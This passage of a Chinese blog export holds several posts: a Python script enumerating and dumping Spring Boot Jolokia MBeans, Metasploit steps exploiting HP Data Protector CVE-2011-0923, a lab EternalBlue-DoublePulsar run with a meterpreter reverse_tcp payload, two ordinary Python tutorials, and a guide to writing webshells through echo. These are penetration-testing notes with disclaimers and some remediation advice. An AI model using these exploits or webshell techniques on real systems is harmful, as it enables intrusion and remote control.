<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">jolokiaurl = <span class="string">&#x27;http://xxx/actuator/jolokia&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">proxies = &#123;&#125;</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">        <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://192.168.1.1:8080&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;http://192.168.1.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 UBrowser/6.1.3397.16 Safari/537.36&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getList</span>(<span class="params">url</span>):</span></span><br><span class="line">    turl = url + <span class="string">&#x27;list&#x27;</span></span><br><span class="line">    r = requests.get(turl)</span><br><span class="line">    <span class="comment"># print(r.json())</span></span><br><span class="line">    <span class="keyword">return</span> r.json()[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parserList</span>(<span class="params">jolokia_list, jolokiaurl</span>):</span></span><br><span class="line">    <span class="keyword">for</span> j_class <span class="keyword">in</span> jolokia_list:</span><br><span class="line">        <span class="keyword">for</span> j_type <span class="keyword">in</span> jolokia_list[j_class]:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;op&#x27;</span> <span class="keyword">in</span> jolokia_list[j_class][j_type]:</span><br><span class="line">                <span class="keyword">for</span> j_op <span class="keyword">in</span> jolokia_list[j_class][j_type][<span class="string">&#x27;op&#x27;</span>]:</span><br><span class="line">                    <span class="keyword">if</span> j_op == <span class="string">&#x27;dump&#x27;</span>:</span><br><span class="line">                        url = <span class="string">f&quot;<span class="subst">&#123;jolokiaurl&#125;</span>exec/<span class="subst">&#123;j_class&#125;</span>:<span class="subst">&#123;j_type&#125;</span>/<span class="subst">&#123;j_op&#125;</span>&quot;</span></span><br><span class="line">                        r = requests.get(url, proxies=proxies, headers=headers)</span><br><span class="line">                        <span class="built_in">print</span>(r.text)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;attr&#x27;</span> <span class="keyword">in</span> jolokia_list[j_class][j_type]:</span><br><span class="line">                <span class="keyword">for</span> j_attr <span class="keyword">in</span> jolokia_list[j_class][j_type][<span class="string">&#x27;attr&#x27;</span>]:</span><br><span class="line">                    url = <span class="string">f&quot;<span class="subst">&#123;jolokiaurl&#125;</span>read/<span class="subst">&#123;j_class&#125;</span>:<span class="subst">&#123;j_type&#125;</span>/<span class="subst">&#123;j_attr&#125;</span>&quot;</span></span><br><span class="line">                    <span class="built_in">print</span>(url)</span><br><span class="line">                    r = requests.get(url, proxies=proxies, headers=headers)</span><br><span class="line">                    <span class="built_in">print</span>(r.text)</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">global</span> jolokiaurl</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;/&#x27;</span> != jolokiaurl[-<span class="number">1</span>:]:</span><br><span class="line">        jolokiaurl += <span class="string">&#x27;/&#x27;</span></span><br><span class="line">    <span class="comment"># print(jolokiaurl)</span></span><br><span class="line">    jolokia_list = getList(jolokiaurl)</span><br><span class="line">    parserList(jolokia_list, jolokiaurl)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>以上仅是个人不太深入的经验总结，欢迎批评指正。授人以鱼不如授人以渔，大家可根据对应的<code>list</code>结果查找可利用的MBean。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://jolokia.org/reference/html/protocol.html#jolokia-operations">https://jolokia.org/reference/html/protocol.html#jolokia-operations</a><br><a href="https://thinkloveshare.com/hacking/ssrf_to_rce_with_jolokia_and_mbeans/">https://thinkloveshare.com/hacking/ssrf_to_rce_with_jolokia_and_mbeans/</a><br><a href="https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Jolokia/%EF%BC%88CVE-2018-1000130%EF%BC%89Jolokia%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Jolokia/%EF%BC%88CVE-2018-1000130%EF%BC%89Jolokia%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a><br><a href="https://www.hacking8.com/bug-product/Spring-Boot/Spring-Boot-Actuator-jolokia-%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E7%9A%84rce%E6%BC%8F%E6%B4%9E.html">https://www.hacking8.com/bug-product/Spring-Boot/Spring-Boot-Actuator-jolokia-%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E7%9A%84rce%E6%BC%8F%E6%B4%9E.html</a></p>
]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>HP Data Protector漏洞利用记录</title>
    <url>/2019/09/03/HP-Data-Protector%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="HP-Data-Protector远程命令执行（CVE-2011-0923）"><a href="#HP-Data-Protector远程命令执行（CVE-2011-0923）" class="headerlink" title="HP Data Protector远程命令执行（CVE-2011-0923）"></a>HP Data Protector远程命令执行（CVE-2011-0923）</h3><p>HP Data Protector存在一个命令执行漏洞，恶意用户可以发送数据包导致这种特殊的服务来执行任意shell命令。这个漏洞在内网中很常见，端口为TCP<code>5555</code>，基本上一打一个准，这里说下利用过程，以作记录。</p>
<h3 id="正常利用过程"><a href="#正常利用过程" class="headerlink" title="正常利用过程"></a>正常利用过程</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/linux/misc/hp_data_protector_cmd_exec</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> rhosts 1.1.1.1</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; exploit</span><br></pre></td></tr></table></figure>
<p><img data-src="/2019/09/03/HP-Data-Protector%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2020-08-20-17-40-26.png"></p>
<a id="more"></a>
<h3 id="网络受限情况下的利用过程"><a href="#网络受限情况下的利用过程" class="headerlink" title="网络受限情况下的利用过程"></a>网络受限情况下的利用过程</h3><p>某些特殊受限网络情况下，无法连接<code>Bind Shell</code>或者<code>Reverse Shell</code>，可以使用<code>cmd/unix/generic</code>这个<code>payload</code>执行命令并获取回显。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/linux/misc/hp_data_protector_cmd_exec</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> rhosts 1.1.1.1</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> payload cmd/unix/generic </span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; <span class="built_in">set</span> cmd whoami</span><br><span class="line">msf5 exploit(linux/misc/hp_data_protector_cmd_exec) &gt; exploit</span><br></pre></td></tr></table></figure>
<p><img data-src="/2019/09/03/HP-Data-Protector%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/2020-08-20-17-41-18.png"></p>
<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ol>
<li>升级Data Protector到A.06.20 或更高版本</li>
<li>对服务启用加密</li>
<li>参考：<br><a href="http://www.zerodayinitiative.com/advisories/ZDI-11-055/">http://www.zerodayinitiative.com/advisories/ZDI-11-055/</a><br><a href="http://seclists.org/bugtraq/2011/Feb/73">http://seclists.org/bugtraq/2011/Feb/73</a><br><a href="http://www.nessus.org/u?6ca03389">http://www.nessus.org/u?6ca03389</a></li>
</ol>
]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit利用Eternalblue-Doublepulsar</title>
    <url>/2019/08/16/Metasploit%E5%88%A9%E7%94%A8Eternalblue-Doublepulsar/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="警告"><a href="#警告" class="headerlink" title="警告"></a>警告</h3><p>本文无任何技术水平，仅用来记录一次<code>Eternalblue-Doublepulsar</code>利用过程，作笔记使用。</p>
<h3 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h3><p>本次实验在虚拟机中进行，攻击机与靶机位于同一局域网内。<br>攻击机：<code>Kali Linux</code>（IP：<code>192.168.200.130</code>）<br>靶机：<code>Windows 7 x64</code>（IP：<code>192.168.200.142</code>）</p>
<a id="more"></a>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>下载<code>Eternalblue-Doublepulsar</code>到<code>/root</code>目录，这里最好不要改，因为工具里面配置的默认目录就是这个目录，改了的话相应的也要在<code>msf</code>里面改<code>DOUBLEPULSARPATH</code>、<code>ETERNALBLUEPATH</code>这两个变量</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git</span><br></pre></td></tr></table></figure>
<p>复制<code>eternalblue_doublepulsar.rb</code>到<code>/usr/share/metasploit-framework/modules/exploits/windows/smb/</code>目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> Eternalblue-Doublepulsar-Metasploit/</span><br><span class="line">cp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/</span><br></pre></td></tr></table></figure>
<p>安装依赖</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32 --fix-missing</span><br></pre></td></tr></table></figure>
<p>创建<code>.wine/drive_c</code>目录，这里不创建的话后面<code>msf</code>利用漏洞时会出现目录不存在错误</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir -p /root/.wine/drive_c</span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>启动<code>msfconsole</code>，如果你已经启动了，可以使用<code>reload_all</code>重新加载<code>msf</code>模块来引入刚下载的模块</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
<p>使用漏洞利用模块，值得注意的一点是需要设置<code>PROCESSINJECT</code>这一变量值，在本次实验中，使用默认值并没有成功，修改<code>PROCESSINJECT</code>为<code>explorer.exe</code>成功拿到<code>meterpreter shell</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/eternalblue_doublepulsar</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.200.142</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.200.130</span><br><span class="line"><span class="built_in">set</span> PROCESSINJECT explorer.exe</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p><img data-src="/2019/08/16/Metasploit%E5%88%A9%E7%94%A8Eternalblue-Doublepulsar/2020-08-20-17-36-14.png"><br><img data-src="/2019/08/16/Metasploit%E5%88%A9%E7%94%A8Eternalblue-Doublepulsar/2020-08-20-17-36-34.png"><br><img data-src="/2019/08/16/Metasploit%E5%88%A9%E7%94%A8Eternalblue-Doublepulsar/2020-08-20-17-36-40.png"><br><img data-src="/2019/08/16/Metasploit%E5%88%A9%E7%94%A8Eternalblue-Doublepulsar/2020-08-20-17-36-47.png"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://laucyun.com/a6cb3c752b0fc10f0a9eeef01f7a5f76.html">通过Metasploit实现对MS17-010漏洞的利用</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Python读取Excel合并单元格</title>
    <url>/2020/04/01/Python%E8%AF%BB%E5%8F%96Excel%E5%90%88%E5%B9%B6%E5%8D%95%E5%85%83%E6%A0%BC/</url>
    <content><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Python 读取Excel合并单元格时，被合并的单元格读出来可能是空值，比如下图中单元格”A3”读取出来的值为空，而我们希望它是”A”。<br><img data-src="/2020/04/01/Python%E8%AF%BB%E5%8F%96Excel%E5%90%88%E5%B9%B6%E5%8D%95%E5%85%83%E6%A0%BC/2020-08-20-19-12-27.png"></p>
<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul>
<li>Python 3</li>
<li>xlrd==1.2.0</li>
</ul>
<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>xlrd提供了<code>sheet.merged_cells</code>用于获取页面中所有的合并单元格坐标。类似：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[(<span class="number">1</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>)]</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>坐标从0开始算起，代表第1行到第4行（不包含4），第0列到第一列（不包含1）为合并单元格。</p>
<p>这里有一个点要注意，xlrd官方说明中，需要在<code>open_workbook</code>时传入<code>formatting_info=True</code>，如果未设置此选项，获取到的合并单元格坐标为空，这点是很多文章没有提到的，可能是版本的变更问题：<br><img data-src="/2020/04/01/Python%E8%AF%BB%E5%8F%96Excel%E5%90%88%E5%B9%B6%E5%8D%95%E5%85%83%E6%A0%BC/2020-08-20-19-14-52.png"></p>
<p>示例代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line">wb = xlrd.open_workbook(<span class="string">&#x27;test.xls&#x27;</span>, formatting_info=<span class="literal">True</span>)</span><br><span class="line">sheet = wb.sheet_by_name(<span class="string">&#x27;Sheet1&#x27;</span>)</span><br><span class="line">mc = sheet.merged_cells</span><br><span class="line"><span class="built_in">print</span>(mc)</span><br></pre></td></tr></table></figure>
<p>结果输出：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[(<span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>)]</span><br></pre></td></tr></table></figure>

<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line"><span class="keyword">from</span> openpyxl <span class="keyword">import</span> Workbook</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_merged_cells_value</span>(<span class="params">sheet, row_index, col_index</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    判断单元格是否为合并单元格，是则返回合并单元格的值，否则返回None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    merged_cells = sheet.merged_cells</span><br><span class="line">    <span class="keyword">for</span> rlo, rhi, clo, chi <span class="keyword">in</span> merged_cells:</span><br><span class="line">        <span class="comment"># 判断行下标是否在合并单元格范围内</span></span><br><span class="line">        <span class="keyword">if</span> row_index <span class="keyword">in</span> <span class="built_in">range</span>(rlo, rhi):</span><br><span class="line">            <span class="comment"># 判断列下标是否在合并单元格范围内</span></span><br><span class="line">            <span class="keyword">if</span> col_index <span class="keyword">in</span> <span class="built_in">range</span>(clo, chi):</span><br><span class="line">                <span class="comment"># 返回单元格值</span></span><br><span class="line">                <span class="keyword">return</span> sheet.cell_value(rlo, clo)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 打开Excel</span></span><br><span class="line">    wb = xlrd.open_workbook(<span class="string">&#x27;test.xls&#x27;</span>, formatting_info=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># 指定工作表</span></span><br><span class="line">    sheet = wb.sheet_by_name(<span class="string">&#x27;Sheet2&#x27;</span>)</span><br><span class="line">    <span class="comment"># 获取总行数</span></span><br><span class="line">    rows_num = sheet.nrows</span><br><span class="line">    <span class="comment"># 获取总列数</span></span><br><span class="line">    cols_num = sheet.ncols</span><br><span class="line">    <span class="comment"># 遍历行</span></span><br><span class="line">    <span class="keyword">for</span> ri <span class="keyword">in</span> <span class="built_in">range</span>(rows_num):</span><br><span class="line">        row = sheet.row_values(ri)</span><br><span class="line">        <span class="comment"># 遍历列</span></span><br><span class="line">        <span class="keyword">for</span> ci <span class="keyword">in</span> <span class="built_in">range</span>(cols_num):</span><br><span class="line">            <span class="comment"># 获取合并单元格值，不是合并单元格的返回None</span></span><br><span class="line">            merged_cell_value = get_merged_cells_value(sheet, ri, ci)</span><br><span class="line">            <span class="comment"># 判断单元格是否在合并单元格清单中，是的话则返回正确的单元格值</span></span><br><span class="line">            <span class="keyword">if</span> merged_cell_value:</span><br><span class="line">                <span class="comment"># 修改行中合并单元格值为正确值</span></span><br><span class="line">                row[ci] = merged_cell_value</span><br><span class="line">        <span class="comment"># 打印列结果</span></span><br><span class="line">        <span class="built_in">print</span>(row)</span><br><span class="line">        <span class="comment"># 后面的根据实际需要进行加工</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="结果输出"><a href="#结果输出" class="headerlink" title="结果输出"></a>结果输出</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;列1&#x27;</span>, <span class="string">&#x27;列2&#x27;</span>, <span class="string">&#x27;列3&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;A&#x27;</span>, <span class="number">1.0</span>, <span class="number">4.0</span>]</span><br><span class="line">[<span class="string">&#x27;A&#x27;</span>, <span class="number">2.0</span>, <span class="number">5.0</span>]</span><br><span class="line">[<span class="string">&#x27;A&#x27;</span>, <span class="number">3.0</span>, <span class="number">6.0</span>]</span><br></pre></td></tr></table></figure>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://xlrd.readthedocs.io/en/latest/api.html?highlight=merged_cells#xlrd.sheet.Sheet.merged_cells">xlrd官方文档</a><br><a href="https://www.jianshu.com/p/24a693fff4a3">python3读取Excel(包含合并单元格)</a></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python常用代码备忘</title>
    <url>/2019/09/16/Python%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81%E5%A4%87%E5%BF%98/</url>
    <content><![CDATA[<h3 id="Python常用代码备忘"><a href="#Python常用代码备忘" class="headerlink" title="Python常用代码备忘"></a>Python常用代码备忘</h3><ol start="0">
<li><p>使用清华pip源安装软件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install jupyter  -i https://pypi.tuna.tsinghua.edu.cn/simple/</span><br></pre></td></tr></table></figure></li>
<li><p>去除HTTP协议头，<code>http://baidu.com</code>-&gt;<code>baidu.com</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">domain = re.sub(<span class="string">&#x27;https?://&#x27;</span>, <span class="string">&#x27;&#x27;</span>, domain, flags=re.IGNORECASE)</span><br></pre></td></tr></table></figure></li>
<li><p>把字符串内多个空格合并成一个空格，<code>&#39;　　　&#39;</code>-&gt;<code>&#39; &#39;</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">line = re.sub(<span class="string">&#x27; +&#x27;</span>, <span class="string">&#x27; &#x27;</span>, line)</span><br></pre></td></tr></table></figure>
<a id="more"></a></li>
<li><p>超大文件读取, 超大文件读取使用fileinput，会逐行读取，而readlines会一次读完导致内存爆炸</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># def read_ip_history_file(filename):</span></span><br><span class="line"><span class="comment">#     with open(filename, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f:</span></span><br><span class="line"><span class="comment">#         for line in f.readlines():</span></span><br><span class="line"><span class="comment">#             line = line.strip()</span></span><br><span class="line"><span class="comment">#             yield line</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_ip_history_file</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> fileinput.<span class="built_in">input</span>([filename], openhook = fileinput.hook_encoded(<span class="string">&quot;utf-8&quot;</span>)):</span><br><span class="line">        <span class="keyword">yield</span> line</span><br><span class="line"> <span class="comment"># 或者</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">read_ip_history_file</span>(<span class="params">filename</span>):</span></span><br><span class="line">     <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">         <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">             line = line.strip()</span><br><span class="line">             <span class="keyword">yield</span> line</span><br></pre></td></tr></table></figure>
</li>
<li><p>日期转换</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 字符串格式化为日期对象</span></span><br><span class="line">mail_date = <span class="string">&#x27;2019-09-29 04:55:46&#x27;</span></span><br><span class="line">strdate = datetime.datetime.strptime(mail_date, <span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>)</span><br><span class="line"><span class="comment"># 日期对象格式化为字符串对象</span></span><br><span class="line">strdate.strftime(<span class="string">&#x27;%Y%m%d&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
<li><p>子线程随父线程退出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">write_flag_task = Thread(target=saveFlag, args=(LOG_FILE_NAME, ))</span><br><span class="line"><span class="comment"># 子线程随父进程退出</span></span><br><span class="line">write_flag_task.setDaemon(<span class="literal">True</span>)</span><br><span class="line">write_flag_task.start()</span><br></pre></td></tr></table></figure></li>
<li><p>拼接脚本依赖文件的绝对路径。比如：脚本依赖一个数据库文件，未防止他人使用脚本时路径异常读不到数据库，需要拼接路径。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">DBPATH = <span class="string">&#x27;123.db&#x27;</span></span><br><span class="line">script_path = sys.argv[<span class="number">0</span>]</span><br><span class="line">abs_script_dir, _ = os.path.split(os.path.abspath(script_path))</span><br><span class="line">DBPATH = os.path.join(abs_script_dir, DBPATH)</span><br></pre></td></tr></table></figure></li>
<li><p>提取中文的正则表达式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&#x27;123你好a&#x27;</span></span><br><span class="line">re.findall(<span class="string">&#x27;[\u4e00-\u9fa5]+&#x27;</span>, s)</span><br><span class="line">输出：[<span class="string">&#x27;你好&#x27;</span>]</span><br></pre></td></tr></table></figure></li>
<li><p>openpyxl 修改Excel的字体样式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">main_wb = Workbook()</span><br><span class="line">main_sheet = main_wb.active</span><br><span class="line"><span class="comment"># 添加Excel首行标题</span></span><br><span class="line">main_sheet.append(</span><br><span class="line">    <span class="string">&#x27;站点URL,站点IP,漏洞名称,漏洞风险值,风险等级,CVE编号,详细描述,解决办法,存在漏洞链接,漏洞验证参数&#x27;</span>.split(<span class="string">&#x27;,&#x27;</span>))</span><br><span class="line"><span class="comment"># 定义标题字体格式</span></span><br><span class="line">t_font = Font(name=<span class="string">&#x27;宋体&#x27;</span>, size=<span class="number">12</span>, bold=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> main_sheet.rows:</span><br><span class="line">    <span class="keyword">for</span> cell <span class="keyword">in</span> row:</span><br><span class="line">        cell.font = t_font</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure></li>
<li><p>openpyxl删除行：<br>删除第三行之后的两行，行号从1开始算</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sheet.delete_rows(<span class="number">3</span>, <span class="number">2</span>) </span><br></pre></td></tr></table></figure>
<p>删除第一列之后的两列，列号从1开始算</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">wk_sheet.delete_cols(<span class="number">1</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="本文持续更新"><a href="#本文持续更新" class="headerlink" title="本文持续更新"></a>本文持续更新</h3>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>SHELL写文件的几种方式</title>
    <url>/2019/08/15/SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文总结了一些通过<code>cmd</code>或者<code>bash</code>等<code>shell</code>写文件的方法，如在某些情况下，拿到了<code>cmd shell</code>或者<code>bash shell</code>，如下图：<br><img data-src="/2019/08/15/SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/2020-08-20-17-00-21.png"></p>
<p>但是靶机无法上公网和反连攻击机，然后通过<code>echo</code>等方式写<code>shell</code>的方法。受限于本人有限的知识面以及实用性等考量，这里列出的方法并不全面，仅供参考。</p>
<a id="more"></a>
<h3 id="Windows-下写文件"><a href="#Windows-下写文件" class="headerlink" title="Windows 下写文件"></a>Windows 下写文件</h3><h4 id="echo写文件"><a href="#echo写文件" class="headerlink" title="echo写文件"></a>echo写文件</h4><p>这是最原始的方法，比较折腾人。如果你以为只要<code>echo 1 &gt; 1.txt</code>这样写入，就图样了。Windows下的<code>cmd echo</code>写入需要特殊字符转义，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt; --- ^&lt;</span><br><span class="line">&gt; --- ^&gt;</span><br><span class="line">/ --- ^/</span><br><span class="line">+ --- ^+</span><br></pre></td></tr></table></figure>
<p>另外，由于web服务器自动转码<code>URL编码</code>，把原本不是URL编码的字符转码了，导致写入的文件错误，所以还需对下面的字符转码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">% --&gt; %25    # --&gt; %23    @ --&gt; %40</span><br><span class="line">+ --&gt; %2b    | --&gt; %7c    &amp; --&gt; ^%26</span><br></pre></td></tr></table></figure>
<p><code>冰蝎</code>马使用这种方法转码的效果如下：<br><img data-src="/2019/08/15/SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/2020-08-20-17-02-27.png"><br>然后通过<code>echo &lt;转码后的payload&gt; &gt; path/xxx.ext</code>写入文件，示例如下：<br><img data-src="/2019/08/15/SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/2020-08-20-17-02-56.png"><br>局限性：</p>
<ul>
<li><p>Echo 字符数量有限，依赖于具体的浏览器也依赖于 web 服务器，当然还有万恶的 IDS。</p>
</li>
<li><p>IE 在地址栏的字符数上限是 2048 个字符</p>
</li>
<li><p>Chrome 没有明显的上限, 超过 1M 的内容也可以轻松接受</p>
</li>
<li><p>Firefox 没有明显的上限, 超过 5M 的内容也可以轻松接受</p>
</li>
<li><p>LinuxWin tomcat jboss 接受的 URL 最大长度是 7800</p>
</li>
<li><p>Windows Tomcat URL7825</p>
</li>
<li><p>Windows PHP Apache URL 最大长度为 8193<br>IIS6 ASP URL 最大长度为 15973</p>
</li>
</ul>
